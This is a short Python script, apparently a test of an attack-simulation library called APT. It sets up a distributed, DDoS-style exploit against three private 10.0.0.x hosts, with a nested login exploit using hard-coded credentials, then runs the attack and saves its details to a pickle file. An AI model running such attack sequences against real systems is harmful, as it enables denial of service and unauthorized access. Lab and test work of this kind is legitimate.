
import APT

atk_seq = [(APT.DistributedExploit(["10.0.0.5", "10.0.0.6", "10.0.0.7"], 4,
                                   APT.UserPropExploit("10.0.0.5", "client1", "pass1")), 1)]
exp_dtls = []
Attack = APT.APTAttack(atk_seq, "test_save_ddos", exp_dtls, "/output/exp_details.pkl")
Attack.run()
Attack.save_in()
